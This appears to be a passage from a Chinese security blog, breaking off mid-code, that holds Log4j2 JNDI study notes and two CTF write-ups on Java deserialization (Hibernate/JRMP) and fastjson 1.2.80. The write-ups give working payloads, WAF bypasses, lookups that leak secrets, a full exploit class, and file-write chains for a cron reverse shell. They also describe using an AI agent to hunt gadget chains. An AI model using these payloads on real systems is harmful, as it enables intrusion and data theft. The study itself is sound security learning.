JEECG-灰盒Fuzzing\nMessagePatternConverter#format这里的format方法，对日志消息里的 ${ 会进行识别，从而进入后面的解析：\n\n而在之后的修复中，是不会对 ${ 进行判断的，后面看补丁的时候会知道。另外，这里的noLookups选项，也暗示了，能够通过修改启动配置来实现对所有lookup的禁用。\nidea可以直接增加JVM选项：\n\n绕过思路有了上面的分析，现在来看看怎么对waf进行一些绕过。\n这里直接搬运网上的了：\n$&#123;$&#123;a:-j&#125;ndi:ldap://127.0.0.1:1389/&#125;$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1389/&#125;$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1389/&#125;$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1389/&#125;$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1389/&#125;\n\n另外，还可以利用一些特殊字符的大小写转化问题（似乎在py ssti 绕过中遇到过）：\nı =&gt; upper =&gt; i (Java 中测试可行)ſ =&gt; upper =&gt; S (Java 中测试可行)İ =&gt; upper =&gt; i (Java 中测试不可行)K =&gt; upper =&gt; k (Java 中测试不可行)\n\n如果涉及到json格式，那还可以尝试各种编码绕过，因为fastjson和jackson组件都支持unicode和hex编码：\n&#123;&quot;key&quot;:&quot;\\u0024\\u007b&quot;&#125;&#123;&quot;key&quot;:&quot;\\x24\\u007b&quot;&#125;\n\n\n\n其他利用sys，env，java等协议结合其他的协议，有时候能够读取一些敏感信息，参考：\nGitHub - jas502n&#x2F;Log4j2-CVE-2021-44228: Remote Code Injection In Log4j \nsys 实际对应 System.getProperty()\nenv 实际对应 System.getenv()\njndi下也支持dns协议，也可以通过dns外带。\n末尾有详细的利用方式，列举部分：\nenv-linux:\nCLASSPATH,HOME,JAVA_HOME,LANG,LC_TERMINAL,LC_TERMINAL_VERSION,LESS,LOGNAME,LSCOLORS,LS_COLORS,MAIL,NLSPATH,OLDPWD,PAGER,PATH,PWD,SHELL,SHLVL,SSH_CLIENT,SSH_CONNECTION,SSH_TTY,TERM,USER,XDG_RUNTIME_DIR,XDG_SESSION_ID,XFILESEARCHPATH,ZSH,_\n\n\nbundle协议这个单开一段，因为利用条件有些不一样，且提及这个协议的文章比较少。\n参考 log4j 漏洞一些特殊的利用方式\nbundle协议对应的lookup代码如下：\n@Override    public String lookup(final LogEvent event, final String key) &#123;        if (key == null) &#123;            return null;        &#125;        final String[] keys = key.split(&quot;:&quot;);        final int keyLen = keys.length;        if (keyLen != 2) &#123;            LOGGER.warn(LOOKUP, &quot;Bad ResourceBundle key format [&#123;&#125;]. Expected format is BundleName:KeyName.&quot;, key);            return null;        &#125;        final String bundleName = keys[0];        final String bundleKey = keys[1];        try &#123;            // The ResourceBundle class caches bundles, no need to cache here.            return ResourceBundle.getBundle(bundleName).getString(bundleKey);        &#125; catch (final MissingResourceException e) &#123;            LOGGER.warn(LOOKUP, &quot;Error looking up ResourceBundle [&#123;&#125;].&quot;, bundleName, e);            return null;        &#125;    &#125;\n\n从代码上来看就很好理解，把 key 按照 : 分割成两份，第一个是 bundleName 获取 ResourceBundle，第二个是 bundleKey 获取 Properties Value\nResourceBundle 在 Java 应用开发中经常被用来做国际化，网站通常会给一段表述的内容翻译成多种语言，比如中文简体、中文繁体、英文。\n那开发者可能就会使用 ResourceBundle 来分别加载 classpath 下的 zh_CN.properties、en_US.properties。并按照唯一的 key 取出对应的那段文字。例如： zh_CN.properties\nLOGIN_SUCCESS=登录成功\n\n那 ResourceBundle.getBundle(&quot;zh_CN&quot;).getString(&quot;LOGIN_SUCCESS&quot;) 获取到的就是 登录成功\n如果系统是 springboot 的话，它会有一个 application.properties 配置文件。里面存放着这个系统的各项配置，其中有可能就包含 redis、mysql 的配置项。当然也不止 springboot，很多其他类型的系统也会写一些类似 jdbc.properties 的文件来存放配置。\n这些 properties 文件都可以通过 ResourceBundle 来获取到里面的配置项。\n比如通过${bundle:application:spring.datasource.password} 来获取数据库密码。\n不过，这个bundle协议在spring环境下的利用有限制，需要将spring默认的日志组件更换成log4j的，如下：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;    &lt;exclusions&gt;        &lt;exclusion&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;/dependency&gt;\n\n这种情况可能并不多见。\n不出网回显参考 浅谈Log4j2信息泄露与不出网回显-腾讯云开发者社区-腾讯云\n这里通过报错回显。下面直接搬运了：\n在tryCallAppender方法中catch了RuntimeException\n\n如果配置了ignoreExceptions选项，就会直接抛出来\n\n接下来就是制造RuntimeException\n例如字符串转数字中有一个NumberFormatException异常，它父类的父类是RuntimeException\nManager.lookup中name是protocal://host:port/path\n其中port本该是int如果给它无法转int的字符串就会抛出这里的信息\n又联想到$&#123;&#125;是支持嵌套标签的，这里嵌入真正想要得到的结果，即可抛出执行结果\n根据这个思路，成功在Tomcat项目中回显执行结果（例如这里的$&#123;java:version&#125;）\n能够回显的Payload是这样：$&#123;jndi:ldap://x.x.x.x:$&#123;java:version&#125;/xxx&#125;\n这里也有限制条件，需要在log4j2.xml中配置 ignoreExceptions&#x3D;”false”\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;warn&quot; name=&quot;MyApp&quot; packages=&quot;&quot;&gt;    &lt;Appenders&gt;        &lt;Console name=&quot;STDOUT&quot; target=&quot;SYSTEM_OUT&quot; ignoreExceptions=&quot;false&quot;&gt;            &lt;PatternLayout pattern=&quot;%m%n&quot;/&gt;        &lt;/Console&gt;    &lt;/Appenders&gt;    &lt;Loggers&gt;        &lt;Root level=&quot;error&quot;&gt;            &lt;AppenderRef ref=&quot;STDOUT&quot;/&gt;        &lt;/Root&gt;    &lt;/Loggers&gt;&lt;/Configuration&gt;\n\n在实际的环境中，有开启这个配置的概率，参考apache官方的描述\n大致意思是在FailoverAppender情况下必须设置该选项为false\n某些情况下开发者想让错误报出来便于调试，也会故意开启这个选项\ntomcat中使用log4j需要修改web.xml：\n&lt;listener&gt;    &lt;listener-class&gt;org.apache.logging.log4j.web.Log4jServletContextListener&lt;/listener-class&gt;&lt;/listener&gt;&lt;filter&gt;    &lt;filter-name&gt;log4jServletFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.apache.logging.log4j.web.Log4jServletFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;context-param&gt;    &lt;param-name&gt;log4jConfiguration&lt;/param-name&gt;    &lt;param-value&gt;file:///YOUR_LOG4J2.XML_PATH&lt;/param-value&gt;&lt;/context-param&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;log4jServletFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;    &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt;    &lt;dispatcher&gt;FORWARD&lt;/dispatcher&gt;    &lt;dispatcher&gt;INCLUDE&lt;/dispatcher&gt;    &lt;dispatcher&gt;ERROR&lt;/dispatcher&gt;    &lt;dispatcher&gt;ASYNC&lt;/dispatcher&gt;&lt;/filter-mapping&gt;\n\n\n\n\n补丁修复&amp;绕过2.15.0-rc1修复点1：\n之前MessagePatternConverter#convert是会解析 ${ 的，但是现在默认不会了：\n\n新版本里加了好多子类，默认情况下会走到MessagePatternConverter$SimpleMessagePatternConverter#format，是不会对 ${ 处理的。\n但是子类LookupMessagePatternConverter#format还是保留了对 ${ 的解析：\n\n进入replaceIn后，就跟之前一样了。\n修复点2：\n在JndiManager中也做了修复：\n\n\n这里的限制很严格，单独一个allowedHost就很棘手了。\n但是rc1中，捕获异常后不会进行任何操作，所以可以通过人为制造异常来绕过前面的检查，直接进入最下面的lookup。\n绕过思路\n1、\n首先要保证 ${ 能够被解析，这里只能手动改配置文件，所以利用要求比较高，在log4j2.xml中添加%m{lookups}。说实话，添加这个是直接看别的文章的，让我自己想肯定不知道，去官方文档里也没找到。\n&lt;Appenders&gt;    &lt;!--输出到控制台--&gt;    &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;        &lt;!--时间戳 启用lookups解析，用于在高版本组件中手动开启 线程名 日志级别（INFO/DEBUG 等） Logger 名称，最多显示 36 个字符 日志消息 换行--&gt;        &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; %m&#123;lookups&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;    &lt;/Console&gt;    &lt;!--输出到文件 logs/app.log--&gt;  &lt;!--filePattern：日志滚动时的文件命名规则，例如 logs/app-2025-12-04-1.log.gz--&gt;    &lt;RollingFile name=&quot;File&quot; fileName=&quot;logs/app.log&quot; filePattern=&quot;logs/app-%d&#123;yyyy-MM-dd&#125;-%i.log.gz&quot;&gt;        &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; %-5level %logger - %msg%n&quot;/&gt;        &lt;Policies&gt;            &lt;SizeBasedTriggeringPolicy size=&quot;10MB&quot;/&gt;  &lt;!--文件超过 10MB 时滚动--&gt;            &lt;TimeBasedTriggeringPolicy/&gt;    &lt;!--按时间滚动（通常是每天）--&gt;        &lt;/Policies&gt;        &lt;DefaultRolloverStrategy max=&quot;7&quot;/&gt;  &lt;!--最多保留 7 个历史文件，超过会删除旧的--&gt;    &lt;/RollingFile&gt;&lt;/Appenders&gt;\n\n这样到时候就能走到LookupMessagePatternConverter#format\n2、\n制造URISyntaxException报错。这里有很多方法：\nldap://127.0.0.1:50389/79fcbc# ldap://127.0.0.1:50389/79fcbc#^ldap://127.0.0.1:50389/ 79fcbc\n\n这样不会影响ldap的正常解析，而且能够实现报错。\n2.15.0-rc2修复就是在抛出报错部分中 return null：\n\njdk17利用环境：2.14.1版本；jdk17.0.6；\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;version&gt;2.7.15&lt;/version&gt;&lt;/dependency&gt;\n\n这里的根本问题就是，jdk17下，只有springboot依赖，怎么进行原生反序列化利用。\n这里已经有其他师傅讲解过了，可以看：高版本JDK下的Spring原生反序列化链 – fushulingのblog\n这里我们直接使用java-chains生成：\n\n这里值得注意的一点是，suid在不同版本会不一样。\nEventListenerList：jdk8  suid：-5677132037850737084；jdk11/jdk17  suid：-7977902244297240866DefaultAdvisorChainFactory：spring-aop &lt;=6.0.9/spring-boot-starter-web &lt;= 3.1.0   suid：6115154060221772279；spring-aop &gt;=6.0.10/spring-boot-starter-web &gt;= 3.1.1  suid：273003553246259276\n\n当没有显式声明suid时，可以通过：\nserialver -classpath &quot;spring-aop-5.3.19.jar&quot; org.springframework.aop.framework.DefaultAdvisorChainFactory\n\n对suid进行查看：\n\n为什么触发了多次首先，ldap加载远程字节码触发两次是容易知道的，之前在学jndi的时候跟过调试。一次触发在Class.forName，另一次在newInstance：\n\n\n接下来往前看，这里还是在getObjectInstance打断点，然后对比两次的调用栈有什么不同：\n\n看不一样处的前一个调用栈：\n\n能够知道，大概率是这个appender有两个，再往前分析调用栈，最终在LoggerConfig#callAppenders：\n\n这两个分别对应在控制台解析一次，在日志文件里解析一次，和log4j2.xml是对应的。\n于是2*2&#x3D;4，就触发了4次。\n工具利用给几个能够进行漏洞检测的：\nGitHub - pureqh&#x2F;Hyacinth: 一款java漏洞集合工具\nyakit里的插件\nburp里的插件 GitHub - f0ng&#x2F;log4j2burpscanner: CVE-2021-44228 Log4j2 BurpSuite Scanner,Customize ceye.io api or other apis,including internal networks\n我这里就burp插件成功了，burp插件测试时，需要手动改成非URL编码的才能正常测试请求头中的内容。\n\n总结回顾一下一开始的目标，这里学到了：\n\n漏洞触发条件；payload解析过程；bypass发现过程\n其他的利用方式，包括其他协议，报错利用\n知道了补丁修复及其绕过\n知道了为什么会触发多次\nburp插件被动&#x2F;主动检测log4j2\n\n参考log4j2_rce分析 | d4m1ts 知识库\nLog4j2 利用手法学习 – 天下大木头\nlog4j2 RCE 分析 – 天下大木头\n浅谈Log4j2信息泄露与不出网回显-腾讯云开发者社区-腾讯云\n当Log4j遇到jdk17~往日种种，你当真不记得了？\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"ISCTF25_Regretful_Deser","url":"/2026/02/03/ISCTF25-Regretful-Deser/","content":"前言我认为这道题的难点在于JRMP那段链子，可能是之前接触的少，所以觉得很难想到。\n题目分析初步分析先看依赖：\n&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-collections&lt;/groupId&gt;        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;        &lt;version&gt;3.2.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.hibernate&lt;/groupId&gt;        &lt;artifactId&gt;hibernate-core&lt;/artifactId&gt;        &lt;version&gt;5.6.15.Final&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;\n\ncc很熟悉，hibernate主要是触发getter方法用的，路径为hashCode–&gt;getter，所以可以以HashMap为入口。这里不展开了，不熟悉hibernate链的可以找文章学一下。\n另外，pom还能得知是jdk8，网上的wp说是8u472。\n再看题目的主要类。\nMain.java，下面保留了主要部分\npublic class Main &#123;    public static void main(String[] args) throws Exception &#123;        int port = 8080;        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);        server.createContext(&quot;/&quot;, new IndexHandler());        server.createContext(&quot;/hello&quot;, new HelloHandler());        server.createContext(&quot;/api/echo&quot;, new EchoHandler());        server.setExecutor((Executor)null);        System.out.println(&quot;Server started at http://localhost:&quot; + port);        server.start();    &#125;    private static void sendText(HttpExchange exchange, int statusCode, String text) throws IOException &#123;        ......    &#125;    private static void sendHtml(HttpExchange exchange, int statusCode, String html) throws IOException &#123;        ....    &#125;    private static String readBody(HttpExchange exchange) throws IOException &#123;        ......    &#125;    private static Map&lt;String, String&gt; parseQuery(String query) throws UnsupportedEncodingException &#123;        。。。。    &#125;    static class IndexHandler implements HttpHandler &#123;        ....    &#125;    static class HelloHandler implements HttpHandler &#123;        ....    &#125;    static class EchoHandler implements HttpHandler &#123;        public void handle(HttpExchange exchange) throws IOException &#123;            List&lt;String&gt; cookie = exchange.getRequestHeaders().get(&quot;Pass&quot;);            String pass = (String)cookie.get(0);            if (!pass.equals(&quot;n1ght&quot;) &amp;&amp; pass.hashCode() == &quot;n1ght&quot;.hashCode()) &#123;                List&lt;String&gt; echo = exchange.getRequestHeaders().get(&quot;echo&quot;);                String s = (String)echo.get(0);                byte[] decode = Base64.getDecoder().decode(s);                try &#123;                    (new SecurityObjectInputStream(new ByteArrayInputStream(decode))).readObject();                &#125; catch (ClassNotFoundException e) &#123;                    throw new RuntimeException(e);                &#125;            &#125;        &#125;    &#125;&#125;\n\n是用HttpServer启动的一个服务，在&#x2F;api&#x2F;echo先通过一个hashCode判断，就能触发反序列化。\nHttpServer的内存马在HFCTF2022的ez_chain遇到过：\nhttps://1diot9.github.io/2025/05/05/WebHandler%E5%86%85%E5%AD%98%E9%A9%AC/\n看一下SecurityObjectInputStream，依旧只保留有效部分\npublic class SecurityObjectInputStream extends ObjectInputStream &#123;    public static String[] blacklist = new String[]&#123;&quot;org.apache.commons.collections&quot;, &quot;javax.swing&quot;, &quot;com.sun.rowset&quot;, &quot;com.sun.org.apache.xalan&quot;, &quot;java.security&quot;, &quot;java.rmi.MarshalledObject&quot;, &quot;javax.management.remote.rmi.RMIConnector&quot;&#125;;&#125;\n\n黑名单类：\norg.apache.commons.collectionsjavax.swingcom.sun.rowsetcom.sun.org.apache.xalanjava.securityjava.rmi.MarshalledObjectjavax.management.remote.rmi.RMIConnector\n\ncc不能直接用。\nEventListenerList不能用。\nJdbcRowSetImpl不能用\nTemplatesImpl不能用\nSignedObject不能用\nRMIConnector不能\n二次反序列化的点基本都没了。\nhashCode碰撞问题这个在HFCTF2022也遇到过，直接看String,hashCode：\n\n(((a*31)+b)*31+c)*31+ …  这样一层层叠加计算hashCode。\n前两位原本是n1，那前面ascii码减1，后面加31即可，变成mP，mPght即可\n\n利用链分析前段就是hibernate那条链。\n后段用hibernate触发getter方法应该是没问题的，从笔记找了一下哪些能用：\n\n剩下的似乎只有LdapAttribute了。\n那能继续打ldap吗？如果是8u472的话，ldap默认是不允许反序列化数据的，那就只能使用RefBypass，然后打本地工厂类。但是依赖里只有cc和hibernate，所以ldap这条路似乎也不可行。\n这里我就卡住了，不会往JRMP部分想，因为之前几乎没用过。\nJRMP破局以下部分是学习wp后的感悟。\n需要先对JRMP的利用有一定了解，这里可以看我之前的文章。\nhttps://1diot9.github.io/2025/11/10/RMI-JRMP-JEP290-LDAP%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86/\n这里的重点在于：只要一个接口被RemoteObjectInvocationHandler（里面的ref指向恶意jrmp）动态代理了，那么这个对象执行任意方法时，都会走RemoteObjectInvocationHandler#invoke，最终走到StreamRemoteCall#executeCall，然后就可以反序列化恶意Exception对象。\n被RemoteObjectInvocationHandler代理的接口有个条件，必须实现Remote接口，理由如图：\n\ninvoke会走到这里，代理如果没实现Remote接口，就会报错。\n看一下java.rmi.activation.ActivationID#activate：\n\n这里的activator字段，类型为Activator接口，继承了Remote：\n\n这就满足上面打JRMP的条件了，我们可以给这个activator套一个动态代理，动态代理里的ref字段指向恶意JRMP，最后JRMP返回恶意Exception对象，在StreamRemoteCall#executeCall触发反序列化。这里的反序列化没有黑名单，所以直接用cc链就行。\n现在只要往前推，推到一个getter方法就行了。这里直接使用idea自带的用法查找功能。注意，用法查找只能在有源码的情况下使用，即为.java文件。所以这里我切换回8u65，因为我只下了这个版本的所有源码。\n对着方法，alt+f7：\n\n\n往上查找两次就找到了。最终的getter方法是sun.rmi.server.ActivatableRef#getRef。\n最终exp如下：\npackage exp;import exp.tools.ReflectTools;import exp.tools.UnsafeTools;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.rmi.server.ActivatableRef;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.FileOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Proxy;import java.rmi.activation.ActivationID;import java.rmi.activation.Activator;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.rmi.server.RemoteRef;import java.util.Base64;import java.util.HashMap;import java.util.Random;public class Exp &#123;    public static void main(String[] args) throws Exception &#123;        String s1 = &quot;n1ght&quot;;        String s2 = &quot;mPght&quot;;        Object payload = getPayload();        byte[] bytes = ReflectTools.ser2bytes(payload);        String s = Base64.getEncoder().encodeToString(bytes);        FileOutputStream fileOutputStream = new FileOutputStream(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\1diot9\\\\Solutions\\\\Pycharm\\\\2025\\\\ISCTF\\\\Regretful_Deser\\\\base64.txt&quot;);        fileOutputStream.write(s.getBytes());    &#125;    public static Object getPayload() throws Exception &#123;        ActivatableRef activatableRef = (ActivatableRef) getActivatableRef(&quot;127.0.0.1&quot;, 13999);                // 获取 getRef 方法并设置为可访问        java.lang.reflect.Method getRefMethod = activatableRef.getClass().getDeclaredMethod(&quot;getRef&quot;);        getRefMethod.setAccessible(true);                GetterMethodImpl getterMethod = new GetterMethodImpl(ActivatableRef.class, &quot;ref&quot;, getRefMethod);        PojoComponentTuplizer o = (PojoComponentTuplizer) UnsafeTools.getObjectByUnsafe(PojoComponentTuplizer.class);        ReflectTools.setFieldValue(o, &quot;getters&quot;, new Getter[]&#123;getterMethod&#125;);        ComponentType o1 = (ComponentType) UnsafeTools.getObjectByUnsafe(ComponentType.class);        ReflectTools.setFieldValue(o1, &quot;componentTuplizer&quot;, o);        ReflectTools.setFieldValue(o1, &quot;propertySpan&quot;, 1);        TypedValue typedValue = new TypedValue(o1, activatableRef);        typedValue.hashCode();        HashMap&lt;Object, Object&gt; hashMap = ReflectTools.makeMap(typedValue, typedValue);        return hashMap;    &#125;    public static Object getActivatableRef(String host, int port) throws Exception &#123;        // 1. 构造底层的 UnicastRef，指向恶意的 JRMP 服务 (例如 ysoserial 的 JRMPListener)        // 这里端口 13999 是攻击者的 JRMP Server        ObjID activatorObjId = new ObjID(ObjID.ACTIVATOR_ID); // 伪装成系统 Activator ID (1)        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef originalRef = new UnicastRef(new LiveRef(activatorObjId, te, false));        // 2. 创建一个 Activator 类型的动态代理        // 也就是构造你上一题中提到的 activator.activate() 的那个 &quot;activator&quot; 对象        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(originalRef);        Activator activatorProxy = (Activator) Proxy.newProxyInstance(                ClassLoader.getSystemClassLoader(),                new Class[]&#123;Activator.class&#125;,                handler        );        // 3. 构造 ActivationID        // ActivationID 的构造函数是 protected 的，需要通过反射调用        // 构造函数签名: ActivationID(Activator activator)        Constructor&lt;ActivationID&gt; activationIDConstructor = ActivationID.class.getDeclaredConstructor(Activator.class);        activationIDConstructor.setAccessible(true);        ActivationID activationID = activationIDConstructor.newInstance(activatorProxy);        // 4. 构造 ActivatableRef        // 这是封装 ActivationID 的关键 Ref        // 构造函数签名: ActivatableRef(ActivationID id, RemoteRef ref)        Class&lt;?&gt; activatableRefClass = Class.forName(&quot;sun.rmi.server.ActivatableRef&quot;);        Constructor&lt;?&gt; activatableRefConstructor = activatableRefClass.getDeclaredConstructor(ActivationID.class, RemoteRef.class);        activatableRefConstructor.setAccessible(true);        // 第二个参数可以为 null，或者传入 originalRef 作为 fallback        Object activatableRef = activatableRefConstructor.newInstance(activationID, null);        return activatableRef;    &#125;&#125;\n\n然后用java-chains开一个JRMP服务：\n\ncurl cat /flag.xxx.xxx  外带flag。\n复现平台：\nhttps://gz.imxbt.cn/games/32/challenges#1195-Regretful_Deser\n总结要是告诉我触发点在java.rmi.activation.ActivationID#activate，可能可以推出来。但是如果让我自己去找，还是有些困难，仍没有彻底弄清楚触发点的搜索逻辑。\n参考https://xz.aliyun.com/news/90777\n","categories":["CTF-Java"],"tags":["Java安全","CTF-Java"]},{"title":"京麒CTF25-FastJ","url":"/2026/02/18/%E4%BA%AC%E9%BA%92CTF25-FastJ/","content":"前言拖了快大半年了，最近好好整理了一下fastjson，来看看这题。\n主要考察fastjson1.2.80在JDK11环境下的写文件利用。\n分析链子分析看pom.xml，发现环境是JDK11。 看了一下依赖，发现只有springboot和fastjson1.2.80，所以这里大概率是用JDK11写文件那条链。\nspringboot环境怎么写文件去RCE？一开始想的是写tomcat-docbase，或者jre&#x2F;classes之类的。但是后面想了一下，这些方法都需要去爆破目录，或者猜目录。不是首选的。\n那剩下的常规方法就是写ssh，或者写计划任务了。不过这个需要有对应的root权限才行。可以先试一下。\n从wp中得知，用的是写计划任务的方式。\nJDK11那条链原本长这样：\nhttps://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/\n&#123;  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,  &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,  &quot;out&quot;: &#123;    &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,    &quot;out&quot;: &#123;      &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,      &quot;file&quot;: &quot;/tmp/asdasd&quot;,      &quot;append&quot;: true    &#125;,    &quot;infl&quot;: &#123;      &quot;input&quot;: &#123;        &quot;array&quot;: &quot;eJxLLE5JTCkGAAh5AnE=&quot;,        &quot;limit&quot;: 14      &#125;    &#125;,    &quot;bufLen&quot;: &quot;100&quot;  &#125;,  &quot;protocolVersion&quot;: 1&#125;\n\n这是68版本的，但80版本里AutoCloseable已经被ban。得想其他版本把MarshalOutputStream打进去。\n再看看80版本jackson+io写文件是怎么打入InputStream的：\n&#123;&quot;a&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.exc.InputCoercionException\\&quot;,\\&quot;p\\&quot;:&#123;&#125;&#125;&quot;,&quot;b&quot;:&#123;&quot;$ref&quot;:&quot;$.a.a&quot;&#125;,&quot;c&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.JsonParser\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\&quot;,\\&quot;in\\&quot;:&#123;&#125;&#125;&quot;,&quot;d&quot;:&#123;&quot;$ref&quot;:&quot;$.c.c&quot;&#125;&#125;\n\n靠的jackson里的异常类。\n参考上面的payload，现在可以找一个异常类的构造方法或是属性中，存在OutputStream的。\n开始找OutputStream的链。\n看了wp，尝试还原了一下思路。\n\n这里要加载的是OutputStream，那就是要找一个写文件相关的类，里面有OutputStream的可能性才大。然后根据原有的jackson链，去找JacksonException的子类。能够看到有一个StreamWriteException，看一下构造函数：\n\n发现全是protected的，fastjson用不了。\n看看它的子类com.fasterxml.jackson.core.JsonGenerationException：\n\nJsonGenerator值得看，是个抽象类，子类不多，一个个看：\n\n这里可以先点进去看一层，这样可以最快筛选到最容易发现的，也就是UTF8JsonGenerator：\n\n那么思路大概清楚了，就是先通过异常类，打入OutputStream，然后走JDK11写文件的链，写计划任务去反弹shell。\nAI找链直接找这里使用claudecode+GLM4.7\n把jackson的源码包给AI：\n\n提示词：\n你是一个fastjson利用链搜寻专家。现在需要寻找fastjson1.2.80版本下的新利用链。当前的要求是，将java.io.OutputStream添加进fastjson的缓存。需要搜索的jar包已经在项目目录下。你需要做的步骤为：1. 确定搜索范围为com.fasterxml.jackson.core.JacksonException及其子类。2. 提取类中的public属性和public构造函数中参数的类型，将提取到的类型及其子类添加到搜索范围，重复上述过程，直到搜索到类中的public属性或public构造函数中参数的类型有java.io.OutputStream。例子一：public class A&#123;\tpublic A(OutputStream out)&#123;\t.....&#125;&#125;A类的public构造方法中存在java.io.OutputStream，搜索结束。例子二：public class A&#123; \tpublic A(B b)&#123; \t.....&#125;&#125;public abstract class B&#123; \tpublic B(C c)&#123; \t.....&#125;&#125;public class D extends B&#123; \tpublic D(OutputStream out)&#123; \t.....&#125;&#125;D类的public构造方法中存在java.io.OutputStream，搜索结束。\n\n\n\n搜索结果：\n\n耗时6分钟左右，还是比较快的。在提示词比较清晰，例子比较完备时，AI找这种短链也是可行的。\n配合mcp这里使用jar-analyzer项目的mcp工具。\nhttps://github.com/jar-analyzer/jar-analyzer/releases/tag/5.15\n\n效果更好了，只用两分钟左右就找到了。\n后面还显式调用过一次jar-ana的skill，不过效果反而不是很好，第一次没找到，找了个com.fasterxml.jackson.core.exc.StreamWriteException，把protected方法算进去了。不过提醒AI后也能顺利找到链子。\n黑名单绕过原JDK11的payload里，出现了java.io.FileOutputStream，这在1.2.71版本中已经进入了黑名单。\n\n再结合题目给出的com.app.FilterFileOutputStream，可以知道，要用它替换java.io.FileOutputStream来绕过黑名单。com.app.FilterFileOutputStream要求传入的prefix为&#x2F;\nExpstep1：\n&#123;&#123;  &quot;@type&quot;: &quot;java.lang.Exception&quot;,  &quot;@type&quot;: &quot;com.fasterxml.jackson.core.JsonGenerationException&quot;,  &quot;g&quot;:&#123;&#125;&#125;,&#123;&quot;@type&quot;: &quot;com.fasterxml.jackson.core.JsonGenerator&quot;,&quot;@type&quot;: &quot;com.fasterxml.jackson.core.json.UTF8JsonGenerator&quot;,&quot;out&quot;:&#123;&#125;&#125;&#125;\n\nstep2：\n&#123;  &quot;@type&quot;: &quot;java.io.OutputStream&quot;,  &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,  &quot;out&quot;: &#123;    &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,    &quot;out&quot;: &#123;      &quot;@type&quot;: &quot;com.app.FilterFileOutputStream&quot;,      &quot;name&quot;: &quot;$&#123;path&#125;&quot;,      &quot;prefix&quot;: &quot;/&quot;    &#125;,    &quot;infl&quot;: &#123;      &quot;input&quot;: &#123;        &quot;array&quot;: &quot;$&#123;array&#125;&quot;,        &quot;limit&quot;: $&#123;limit&#125;      &#125;    &#125;,    &quot;bufLen&quot;: &quot;100&quot;  &#125;,  &quot;protocolVersion&quot;: 1&#125;\n\n\n\npackage com.solution;import com.alibaba.fastjson.JSON;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;import java.util.zip.Deflater;public class Exp &#123;    public static void main(String[] args) throws IOException &#123;        String step1 = new String(Files.readAllBytes(Paths.get(&quot;step1.json&quot;)), StandardCharsets.UTF_8);        try&#123;            JSON.parse(step1);        &#125;catch(Exception e)&#123;        &#125;        String path = &quot;D:/1tmp/1.txt&quot;;        String content = &quot;ctf flag&quot;;        // limit 长度可能要根据报错修改        HashMap&lt;String, Object&gt; map = gzcompress(content);        String array = (String) map.get(&quot;array&quot;);        int limit = (int) map.get(&quot;limit&quot;);        String poc = new 